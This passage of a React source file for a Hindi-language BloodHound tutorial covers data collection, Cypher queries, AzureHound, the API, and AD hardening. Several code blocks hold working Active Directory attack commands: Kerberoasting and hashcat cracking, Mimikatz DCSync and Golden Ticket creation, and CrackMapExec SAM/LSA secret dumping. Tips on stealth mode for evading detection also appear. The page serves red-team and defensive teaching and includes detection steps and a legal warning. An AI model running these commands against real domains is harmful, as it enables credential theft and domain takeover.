        code={"# BloodHound से Kerberoastable users ढूंढो\n# फिर Mimikatz से TGS request करो:\n\n# Mimikatz में:\nkerberos::list /export\n# या Invoke-Kerberoast PowerShell से:\nInvoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII hashes.txt\n\n# Hashcat से crack करो:\nhashcat -m 13100 hashes.txt rockyou.txt\n\n# BloodHound से DCSync rights वाले users ढूंढो\n# फिर Mimikatz से DCSync:\nlsadump::dcsync /domain:target.local /user:krbtgt\n# Golden Ticket बनाओ:\nkerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:hash /ptt"}
      />
      <CodeBlock
        title="BloodHound + CrackMapExec Combo"
        code={"# BloodHound से \"Computers where Domain Users are Local Admin\" ढूंढो\n# फिर CrackMapExec से lateral movement:\n\n# सभी कंप्यूटर्स पर local admin access check करो:\ncrackmapexec smb 192.168.1.0/24 -u user -p password\n\n# जहाँ access मिले, वहाँ secrets dump करो:\ncrackmapexec smb 192.168.1.50 -u user -p password --sam\ncrackmapexec smb 192.168.1.50 -u user -p password --lsa\n\n# BloodHound से session data देखो\n# जो user admin है उसका hash crack करो या relay करो"}
      />

      <h2>Performance Tuning</h2>
      <p>
        बड़े डोमेन्स (10,000+ users) में BloodHound slow हो सकता है। Performance optimize करने के लिए कुछ tips हैं।
      </p>
      <CodeBlock
        title="Performance Optimization"
        code={"# Neo4j memory बढ़ाओ (neo4j.conf):\ndbms.memory.heap.initial_size=4G\ndbms.memory.heap.max_size=8G\ndbms.memory.pagecache.size=4G\n\n# BloodHound CE में:\n# Docker compose file में memory limits सेट करो\n# PostgreSQL performance tuning करो\n\n# SharpHound optimization:\n# सिर्फ ज़रूरी data collect करो (All की जगह specific methods):\nSharpHound.exe -c Group,Session,ACL,Trusts\n# Loop mode से continuous collection:\nSharpHound.exe -c All --loop --loopduration 02:00:00\n\n# Neo4j indexes create करो (performance बढ़ती है):\n# BloodHound GUI में settings -> Debug -> Create Indexes\n\n# बड़े datasets के लिए:\n# BloodHound CE use करो (better performance)\n# PostgreSQL optimize करो\n# समय-समय पर database purge करो और fresh import करो"}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        BloodHound सिर्फ अटैक पाथ्स ही नहीं, बल्कि comprehensive AD security reports भी generate करता है। PlumHound extension reporting के लिए专门 बना है।
      </p>
      <CodeBlock
        title="PlumHound Reporting"
        code={"# PlumHound install करो:\ngit clone https://github.com/PlumHound/PlumHound.git\ncd PlumHound\npip install -r requirements.txt\n\n# BloodHound database से reports generate करो:\npython3 PlumHound.py --server bolt://localhost:7687 --username neo4j --password password --allreports\n\n# Specific reports:\npython3 PlumHound.py --server bolt://localhost:7687 -p password --tasks easy\n# easy = basic reports (Kerberoastable, AS-REP, Domain Admins)\n\n# HTML report generate करो:\npython3 PlumHound.py --server bolt://localhost:7687 -p password --tasks easy --reportHTML report.html\n\n# Custom queries से report:\npython3 PlumHound.py --server bolt://localhost:7687 -p password --tasks \"MATCH (u:User {hasspn:true}) RETURN u.name\"\n\n# CE version में API से reporting:\ncurl -X GET http://localhost:8080/api/v2/domains -H \"Authorization: Bearer token\""}
      />

      <h2>Comparison Table</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">BloodHound</th>
              <th className="text-left py-2 px-3 text-neon-green">PingCastle</th>
              <th className="text-left py-2 px-3 text-neon-green">ADRecon</th>
              <th className="text-left py-2 px-3 text-neon-green">PlumHound</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">टाइप</td><td className="py-2 px-3">ग्राफ़ मैपिंग</td><td className="py-2 px-3">हेल्थ चेक</td><td className="py-2 px-3">रेकन</td><td className="py-2 px-3">रिपोर्टिंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">ग्राफ़ DB</td><td className="py-2 px-3">Neo4j</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">Neo4j</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">विज़ुअलाइज़ेशन</td><td className="py-2 px-3">हाँ (GUI)</td><td className="py-2 px-3">HTML रिपोर्ट</td><td className="py-2 px-3">CSV</td><td className="py-2 px-3">HTML/PDF</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">अटैक पाथ्स</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">कस्टम क्वेरी</td><td className="py-2 px-3">Cypher</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">Cypher</td></tr>
            <tr><td className="py-2 px-3 text-white">मुफ़्त</td><td className="py-2 px-3">हाँ (ओपन सोर्स)</td><td className="py-2 px-3">फ्री/पेड</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { problem: 'Neo4j स्टार्ट नहीं हो रहा', solution: 'Neo4j का वर्जन चेक करो — BloodHound 4.x को Neo4j 4.x चाहिए। पोर्ट 7474 और 7687 फ्री होने चाहिए। sudo neo4j console से देखो क्या एरर आ रहा है।' },
          { problem: 'SharpHound "Access Denied" दे रहा है', solution: 'यूज़र अकाउंट में डोमेन जॉइन्ड मशीन पर पर्याप्त परमिशन नहीं है। डोमेन यूज़र अकाउंट इस्तेमाल करो जिसे LDAP पढ़ने की परमिशन हो।' },
          { problem: 'BloodHound GUI खाली दिखा रहा है', solution: 'ZIP फाइल सही से इम्पोर्ट नहीं हुई। SharpHound का आउटपुट ZIP फाइल BloodHound GUI में ड्रैग & ड्रॉप करो। डेटा कलेक्शन पूरा हुआ कि नहीं चेक करो।' },
          { problem: 'शॉर्टेस्ट पाथ नहीं दिख रहा', solution: 'सभी कलेक्शन मेथड्स इस्तेमाल करो: SharpHound.exe -c All। Session कलेक्शन ज़रूरी है अटैक पाथ्स के लिए। --loop मोड इस्तेमाल करो।' },
          { problem: 'बहुत धीमा चल रहा है', solution: 'Neo4j मेमोरी बढ़ाओ (neo4j.conf में dbms.memory.heap.max_size)। बड़े डोमेन्स में SharpHound धीमा हो सकता है — --stealth मोड इस्तेमाल करो। BloodHound CE बेहतर परफॉर्मेंस देता है।' },
          { problem: 'Python bloodhound लाइब्रेरी एरर दे रही है', solution: 'pip install --upgrade bloodhound करो। DNS रिज़ॉल्यूशन चेक करो — -ns फ्लैग से DNS सर्वर स्पेसिफाई करो। NetBIOS नाम रिज़ॉल्यूशन भी चेक करो।' },
          { problem: 'BloodHound CE Docker start नहीं हो रहा', solution: 'Docker और Docker Compose versions चेक करो। पोर्ट 8080, 7474, 7687 फ्री होने चाहिए। docker compose logs से error देखो। Memory कम हो सकती है — कम से कम 4GB RAM चाहिए।' },
          { problem: 'SharpHound "KDC_ERR_S_PRINCIPAL_UNKNOWN" दे रहा है', solution: 'Service account SPN set नहीं है। या domain controller reach नहीं हो रहा। DNS settings check करो और DC IP manually specify करो: --domaincontroller dc01.target.local' },
          { problem: 'Graph visualization बहुत cluttered दिख रही है', solution: 'Left panel में node types filter करो। सिर्फ Users या Computers दिखाओ। Edge types भी filter करो — सिर्फ relevant relationships रखो। "Path finding" mode use करो instead of full graph.' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-red-400 font-mono font-semibold mb-2">❌ {item.problem}</h4>
            <p className="text-gray-400 text-sm">✅ {item.solution}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        BloodHound का डिटेक्शन और AD की सुरक्षा दोनों ज़रूरी हैं। Blue टीम्स को पता होना चाहिए कि SharpHound कैसे डिटेक्ट करें और अटैक पाथ्स कैसे तोड़ें।
      </p>
      <CodeBlock
        title="Detection & Defense"
        code={"# SHARPHOUND डिटेक्शन:\n\n# 1. LDAP क्वेरी मॉनिटरिंग:\n# Windows Event ID 1644 — LDAP क्वेरीज़ लॉग करो\n# SharpHound बहुत सारी LDAP क्वेरीज़ भेजता है\n\n# 2. नेटवर्क ट्रैफ़िक:\n# असामान्य LDAP ट्रैफ़िक देखो — SharpHound हज़ारों क्वेरीज़ भेजता है\n\n# 3. Process मॉनिटरिंग:\n# SharpHound.exe प्रोसेस देखो\n# .NET assemblies जो LDAP कॉल कर रही हैं\n\n# 4. Honeypot अकाउंट्स:\n# फेक अकाउंट्स बनाओ जो Domain Admin मेंबर दिखें\n# जब कोई इन्हें टार्गेट करे — अलर्ट आएगा\n\n# DEFENSE — अटैक पाथ्स तोड़ो:\n# 1. Admin tiering — Tier 0, 1, 2 सेपरेशन\n# 2. अनावश्यक AdminTo रिलेशनशिप्स हटाओ\n# 3. Service accounts को AdminTo न दो\n# 4. LAPS (Local Admin Password Solution) लगाओ\n# 5. Kerberoastable SPNs हटाओ\n# 6. AS-REP रोस्टिंग रोको (DONT_REQ_PREAUTH हटाओ)\n# 7. GPO enforcement — लोकल एडमिन ग्रुप कंट्रोल करो"}
      />
      <CodeBlock
        title="Active Directory Hardening"
        code={"# Kerberoasting mitigation:\n# Service accounts को long complex passwords दो (25+ chars)\n# Group Managed Service Accounts (gMSA) use करो\n# SPN accounts को Domain Admin से हटाओ\n\n# AS-REP Roasting mitigation:\n# DONT_REQ_PREAUTH flag हटाओ सभी accounts से:\nSet-ADAccountControl -Identity user -DoesNotRequirePreAuth $false\n\n# Unconstrained Delegation हटाओ:\n# Computers को constrained delegation दो\n# Unconstrained delegation set करने से बचो\n\n# Admin tiering implement करो:\n# Tier 0: Domain Controllers, Domain Admins\n# Tier 1: Servers, App Admins\n# Tier 2: Workstations, Users\n# Cross-tier admin access block करो\n\n# LAPS deploy करो:\n# Local Admin Password Solution install करो\n# हर machine का local admin password unique होगा\n# BloodHound LAPS-enabled machines track करता है"}
      />

      <h2>Lab Environment Setup</h2>
      <p>
        BloodHound सीखने के लिए अपना AD लैब बनाओ। VirtualBox या VMware में Windows Server और कुछ क्लाइंट मशीन्स सेटअप करो।
      </p>
      <CodeBlock
        title="AD Lab Setup"
        code={"# ज़रूरी मशीन्स:\n# 1. Windows Server 2019/2022 — Domain Controller\n# 2. Windows 10/11 — Domain Member (2-3 मशीन्स)\n# 3. Kali Linux — BloodHound चलाने के लिए\n\n# स्टेप 1: Windows Server पर AD DS इंस्टॉल:\nInstall-WindowsFeature AD-Domain-Services -IncludeManagementTools\nInstall-ADDSForest -DomainName \"lab.local\" -DomainNetBIOSName \"LAB\"\n\n# स्टेप 2: यूज़र्स और ग्रुप्स बनाओ:\nNew-ADUser -Name \"TestUser1\" -SamAccountName \"testuser1\"\nNew-ADGroup -Name \"Tier1Admins\" -GroupScope Global\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"Administrator\"\n\n# स्टेप 3: कंप्यूटर्स जॉइन करो:\n# Windows 10 मशीन्स को डोमेन में जॉइन करो\n\n# स्टेप 4: SharpHound चलाओ:\n# डोमेन मेंबर मशीन से:\nSharpHound.exe -c All\n\n# स्टेप 5: Kali पर BloodHound में इम्पोर्ट करो\n# Neo4j + BloodHound GUI शुरू करो\n# ZIP फाइल ड्रैग & ड्रॉप करो"}
      />
      <CodeBlock
        title="Vulnerable AD Lab Config"
        code={"# Vulnerable configurations बनाओ (attack paths के लिए):\n\n# 1. Kerberoastable service account:\nNew-ADUser -Name \"svc_sql\" -SamAccountName \"svc_sql\" -ServicePrincipalNames \"MSSQLSvc/sql01.lab.local\"\nSet-ADAccountPassword -Identity \"svc_sql\" -NewPassword (ConvertTo-SecureString \"Password123\" -AsPlainText -Force)\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"svc_sql\"\n\n# 2. AS-REP Roastable user:\nNew-ADUser -Name \"roastme\" -SamAccountName \"roastme\"\nSet-ADAccountControl -Identity \"roastme\" -DoesNotRequirePreAuth $true\n\n# 3. Local admin on multiple machines:\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"TestUser1\"\n\n# 4. Unconstrained delegation:\nSet-ADComputer -Identity \"sql01\" -TrustedForDelegation $true\n\n# 5. DCSync rights:\n# एक user को Replicating Directory Changes दो\n\n# अब SharpHound चलाओ और BloodHound में देखो\n# \"Find Shortest Paths to Domain Admin\" query से सब paths दिखेंगे"}
      />

      <h2>Cypher Queries Reference</h2>
      <p>
        BloodHound की real power Cypher queries में है। Neo4j Cypher query language से custom attack paths ढूंढ सकते हो जो pre-built queries में नहीं हैं। यह red team operations में बहुत useful है।
      </p>
      <CodeBlock
        title="Essential Cypher Queries"
        code={"# सभी Domain Admins:\nMATCH (g:Group {name:\"DOMAIN ADMINS@TARGET.LOCAL\"}) MATCH (u:User) RETURN u.name\n\n# Kerberoastable users:\nMATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames\n\n# AS-REP Roastable users:\nMATCH (u:User {dontreqpreauth:true}) RETURN u.name\n\n# Computers जहाँ Domain Users local admin हैं:\nMATCH p=shortestPath((g:Group {name:\"DOMAIN USERS@TARGET.LOCAL\"})-[MemberOf|AdminTo*1..]->(c:Computer)) RETURN p\n\n# Unconstrained Delegation computers:\nMATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name\n\n# DCSync rights वाले users:\nMATCH p=shortestPath((u:User)-[MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain)) RETURN p\n\n# Sessions (logged in users):\nMATCH (c:Computer)-[:HasSession]->(u:User) RETURN c.name, u.name\n\n# Shortest path to Domain Admin from any user:\nMATCH p=shortestPath((u:User)-[MemberOf|AdminTo|HasSession*1..]->(g:Group {name:\"DOMAIN ADMINS@TARGET.LOCAL\"})) RETURN p"}
      />
      <CodeBlock
        title="Custom Attack Path Queries"
        code={"# High Value targets with weak paths:\nMATCH (n {highvalue:true}), (u:User), p=shortestPath((u)-[*1..5]->(n)) RETURN p\n\n# Computers with LAPS (Local Admin Password Solution):\nMATCH (c:Computer {haslaps:true}) RETURN c.name\n\n# Computers WITHOUT LAPS:\nMATCH (c:Computer {haslaps:false}) RETURN c.name\n\n# Foreign group membership (cross-domain):\nMATCH (u:User)-[:MemberOf]->(g:Group) WHERE NOT g.domain = u.domain RETURN u.name, g.name\n\n# Users with SPN set (Kerberoastable):\nMATCH (u:User) WHERE u.serviceprincipalnames IS NOT NULL RETURN u.name, u.serviceprincipalnames\n\n# AdminCount = 1 users (privileged):\nMATCH (u:User {admincount:true}) RETURN u.name\n\n# Computers with constrained delegation:\nMATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate"}
      />

      <h2>Azure AD (Entra ID) Integration</h2>
      <p>
        BloodHound CE में Azure AD (अब Entra ID) integration है। Hybrid environments में on-premises AD और Azure AD दोनों का graph बनता है। यह cloud-based attack paths ढूंढने में मदद करता है।
      </p>
      <CodeBlock
        title="AzureHound Usage"
        code={"# AzureHound install करो:\n# GitHub से latest release download करो\n\n# Azure AD login:\naz login\n\n# AzureHound collect करो:\nazurehound start -u user@company.com -p password --tenant <tenant-id>\n\n# BloodHound CE में import करो:\n# ZIP फाइल upload करो\n\n# Azure-specific queries:\n# Azure Global Admins:\nMATCH (n:AZRole {name:\"Global Administrator\"}) RETURN n\n\n# Azure VMs with admin access:\nMATCH p=shortestPath((u:User)-[MemberOf|AZGlobalAdmin|AZVMAdmin*1..]->(v:AZVM)) RETURN p\n\n# Hybrid attack paths (on-prem to Azure):\nMATCH p=shortestPath((u:User)-[MemberOf|SyncedTo*1..]->(a:AZUser)) RETURN p"}
      />

      <h2>Advanced Techniques</h2>
      <p>
        BloodHound में कुछ एडवांस्ड टेक्निक्स हैं जो रेड टीम्स इस्तेमाल करती हैं। ये टेक्निक्स AD की कॉम्प्लेक्स कमज़ोरियों को एक्सप्लॉइट करती हैं।
      </p>
      <CodeBlock
        title="Advanced Techniques"
        code={"# KERBEROAST ATTACK PATH:\n# 1. BloodHound में \"Find Kerberoastable Users\" क्वेरी चलाओ\n# 2. SPN वाले यूज़र्स मिलेंगे\n# 3. Mimikatz/Invoke-Kerberoast से TGS रिक्वेस्ट करो\n# 4. हैश क्रैक करो\n\n# AS-REP ROASTING PATH:\n# 1. \"Find AS-REP Roastable Users\" क्वेरी\n# 2. DONT_REQ_PREAUTH वाले यूज़र्स\n# 3. GetNPUsers.py से हैश निकालो\n# 4. हैश क्रैक करो\n\n# DCSync PATH:\n# 1. \"Find Principals with DCSync Rights\" क्वेरी\n# 2. GetChanges + GetChangesAll वाले यूज़र्स\n# 3. Mimikatz: lsadump::dcsync /domain:target.local /user:krbtgt\n# 4. Golden Ticket बनाओ\n\n# ACL ABUSE PATH:\n# 1. GenericAll, WriteDacl, ForceChangePassword एजेज़ ढूंढो\n# 2. यूज़र प्रॉपर्टीज़ बदलो\n# 3. SPN सेट करो या पासवर्ड रीसेट करो\n\n# CROSS-FOREST TRUST PATH:\n# 1. Trusts कलेक्शन चलाओ\n# 2. फॉरेन ग्रुप मेंबरशिप ढूंढो\n# 3. फॉरेन सिड हिस्ट्री एब्यूज करो"}
      />

      <h2>BloodHound CE API Usage</h2>
      <p>
        BloodHound CE में REST API available है जिससे automated queries और reporting कर सकते हो। यह CI/CD pipelines और automated security assessments में useful है।
      </p>
      <CodeBlock
        title="BloodHound CE API"
        code={"# Login और token प्राप्त करो:\ncurl -X POST http://localhost:8080/api/v2/login \\\\\n  -H \"Content-Type: application/json\" \\\\\n  -d '{\"login_method\":\"secret\",\"username\":\"admin\",\"password\":\"admin\"}'\n\n# Token से API calls:\nTOKEN=\"your_jwt_token\"\n\n# सभी domains list करो:\ncurl -X GET http://localhost:8080/api/v2/domains \\\\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Users list करो:\ncurl -X GET http://localhost:8080/api/v2/domains/{domain_id}/users \\\\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Computers list करो:\ncurl -X GET http://localhost:8080/api/v2/domains/{domain_id}/computers \\\\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Shortest path query:\ncurl -X GET \"http://localhost:8080/api/v2/graphs/shortest-path?start_type=User&end_type=Group&end_name=DOMAIN ADMINS@TARGET.LOCAL\" \\\\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Python से API automation:\n# python3 -c \"\n# import requests\n# base = 'http://localhost:8080/api/v2'\n# r = requests.post(f'{base}/login', json={'login_method':'secret','username':'admin','password':'admin'})\n# token = r.json()['data']['session_token']\n# headers = {'Authorization': f'Bearer {token}'}\n# domains = requests.get(f'{base}/domains', headers=headers).json()\n# print(domains)\n# \""}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या BloodHound बिना Neo4j के चल सकता है?', a: 'पुराने वर्जन (4.x) को Neo4j ज़रूरी है। नया BloodHound CE PostgreSQL इस्तेमाल करता है और Docker में आता है — अलग से Neo4j इंस्टॉल करने की ज़रूरत नहीं।' },
          { q: 'SharpHound डिटेक्ट हो सकता है?', a: 'हाँ, SharpHound हज़ारों LDAP क्वेरीज़ भेजता है जो Event ID 1644 में दिखती हैं। --stealth मोड से कम क्वेरीज़ भेजता है, लेकिन फिर भी डिटेक्ट हो सकता है।' },
          { q: 'क्या BloodHound Python वर्जन सेफ है?', a: 'bloodhound-python लाइब्रेरी भी LDAP क्वेरीज़ भेजती है। डिटेक्शन रिस्क वही है। Linux से चलाने का फायदा यह है कि Windows मशीन एक्सेस करने की ज़रूरत नहीं।' },
          { q: 'बड़े डोमेन्स में कितना टाइम लगता है?', a: '10,000+ यूज़र्स वाले डोमेन में SharpHound को 30 मिनट से 2 घंटे लग सकते हैं। --stealth मोड और स्पेसिफिक कलेक्शन मेथड्स से टाइम कम होता है। BloodHound CE बेहतर परफॉर्मेंस देता है।' },
          { q: 'क्या BloodHound Azure AD भी सपोर्ट करता है?', a: 'BloodHound CE में Azure AD (Entra ID) सपोर्ट है। AzureHound डेटा कलेक्टर Azure AD का डेटा कलेक्ट करता है। पुराने वर्जन में Azure सपोर्ट सीमित है।' },
          { q: 'BloodHound से डेटा कैसे रिमूव करें?', a: 'Neo4j में: MATCH (n) DETACH DELETE n। BloodHound CE में GUI में "Purge Database" ऑप्शन है। डेटा कलेक्शन के बाद ज़रूरी है कि डेटा सेफ रखो और टेस्टिंग के बाद डिलीट करो।' },
          { q: 'क्या BloodHound cross-forest trusts भी दिखाता है?', a: 'हाँ, SharpHound -c Trusts से cross-forest trust relationships collect होती हैं। "Find Principals with Foreign Domain Group Membership" क्वेरी से cross-domain attack paths दिखते हैं।' },
          { q: 'BloodHound CE और legacy BloodHound में क्या फ़र्क है?', a: 'CE में PostgreSQL backend (Neo4j की जगह), Docker deployment, better performance, Azure AD support, और API access है। Legacy version में Neo4j + Electron GUI था। CE recommended है नए setups के लिए।' },
          { q: 'क्या BloodHound domain admin credentials बिना चल सकता है?', a: 'हाँ, किसी भी domain user account से SharpHound चल सकता है जिसे LDAP read permission हो। Domain admin ज़रूरी नहीं है। लेकिन admin account से ज़्यादा data collect होता है।' },
          { q: 'SharpHound कितना network traffic generate करता है?', a: 'बड़े डोमेन में SharpHound हज़ारों LDAP queries भेजता है — यह detectable है। --stealth mode से traffic कम होता है लेकिन data भी कम collect होता है। Loop mode में continuous traffic होती है।' },
          { q: 'क्या BloodHound GPO abuse paths भी दिखाता है?', a: 'हाँ, GPLink edges से GPO-to-OU relationships दिखती हैं। अगर किसी GPO में "Restricted Groups" policy है जो local admin group में users add करती है, तो BloodHound यह path दिखाएगा। GPO abuse powerful lateral movement technique है।' },
          { q: 'BloodHound data export कैसे करें?', a: 'Neo4j cypher-shell से CSV export कर सकते हो। PlumHound से HTML/PDF reports generate होती हैं। CE version में API से JSON export possible है। SharpHound raw data ZIP file भी keep करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-neon-green font-mono font-semibold mb-2">❓ {item.q}</h4>
            <p className="text-gray-400 text-sm">{item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">लिंक</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PingCastle</td><td className="py-2 px-3">AD हेल्थ चेक और रिस्क असेसमेंट</td><td className="py-2 px-3">pingcastle.com</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ADRecon</td><td className="py-2 px-3">AD रेकन और रिपोर्टिंग</td><td className="py-2 px-3">GitHub</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PlumHound</td><td className="py-2 px-3">BloodHound रिपोर्टिंग इंजन</td><td className="py-2 px-3">GitHub</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">MANSPIDER</td><td className="py-2 px-3">फाइल शेयर रेकन + BloodHound</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Certify</td><td className="py-2 px-3">AD Certificate Services अटैक</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Whisker</td><td className="py-2 px-3">Shadow Credentials अटैक</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">PowerView</td><td className="py-2 px-3">AD enumeration PowerShell</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">SharpHound</td><td className="py-2 px-3">BloodHound data collector</td><td className="py-2 px-3">GitHub</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">AzureHound</td><td className="py-2 px-3">Azure AD data collector</td><td className="py-2 px-3">GitHub</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>SharpHound को --loop मोड में चलाओ — कंटीन्यूअस डेटा कलेक्शन होगा और session changes track होंगे</li>
          <li>सभी कलेक्शन मेथड्स इस्तेमाल करो: -c All — कम करने से अटैक पाथ्स मिस हो सकते हैं</li>
          <li>BloodHound + Mimikatz कॉम्बो बहुत पावरफुल है — Mimikatz से हैशेस, BloodHound से अटैक पाथ</li>
          <li>Blue टीम के लिए भी BloodHound इस्तेमाल करो — AD की कमज़ोरियां पहचानो और ठीक करो</li>
          <li>बड़े डोमेन्स में BloodHound CE इस्तेमाल करो — बेहतर परफॉर्मेंस और नए फीचर्स</li>
          <li>Honeypot accounts बनाओ Domain Admin group में — जब SharpHound इन्हें target करे, alert आएगा</li>
          <li>Cypher queries save करो और reuse करो — custom queries बहुत useful हैं specific findings के लिए</li>
          <li>BloodHound data regularly purge करो testing के बाद — sensitive data leak risk होता है</li>
          <li>PlumHound से automated reports generate करो — client deliverables के लिए professional reports मिलती हैं</li>
          <li>AzureHound से cloud environment भी map करो — hybrid attack paths बहुत common हैं</li>
          <li>Custom Cypher queries library बनाओ — हर engagement में reuse होगी</li>
          <li>SharpHound --stealth mode production environments में use करो — detection risk कम होता है</li>
          <li>BloodHound data को encrypted storage में रखो — AD data बहुत sensitive है</li>
          <li>Purple team exercises में BloodHound both sides पर use करो — attack paths identify और fix करो</li>
          <li>Honeypot accounts बनाओ Domain Admin group में — detection mechanism के रूप में</li>
          <li>BloodHound CE API से automated reporting pipeline बनाओ — SIEM integration के लिए</li>
          <li>SharpHound output ZIP files encrypt करो transfer करते समय — sensitive AD data है</li>
          <li>Regular AD audits के लिए monthly BloodHound scans schedule करो</li>
          <li>Cross-forest trusts minimize करो — हर trust relationship potential attack path है</li>
          <li>Service accounts को least privilege दो — Domain Admin membership avoid करो</li>
          <li>AD Certificate Services abuse paths भी check करो — ADCS attacks बहुत common हैं</li>
          <li>BloodHound CE Docker deployment का regular backup लो — database loss critical है</li>
          <li>Kerberoastable accounts को gMSA (Group Managed Service Accounts) से replace करो — much safer</li>
          <li>AS-REP Roasting prevent करने के लिए सभी users पर DONT_REQ_PREAUTH flag हटाओ</li>
          <li>Unconstrained delegation हटाओ — constrained delegation use करो instead</li>
          <li>AD Certificate Services (ADCS) abuse paths check करो — ESC1-ESC8 vulnerabilities</li>
          <li>BloodHound data retention policy बनाओ — engagement के बाद 30 days में delete करो</li>
          <li>Network segmentation implement करो — cross-VLAN admin access minimize करो</li>
          <li>Privileged Access Management (PAM) solution deploy करो — admin sessions monitor होंगे</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फ़ाइनल चेतावनी:</strong> BloodHound केवल अधिकृत Red Team ऑपरेशंस और सुरक्षा ऑडिट में ही इस्तेमाल करें। बिना अनुमति के AD रेकन गंभीर अपराध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत एक्सेस और रेकन दंडनीय है। केवल अपने लैब वातावरण या लिखित अनुमति के साथ ही उपयोग करें। SharpHound का डेटा संवेदनशील है — सुरक्षित रखें और टेस्टिंग के बाद डिलीट करें।
      </div>
    </TutorialLayout>
  )
}
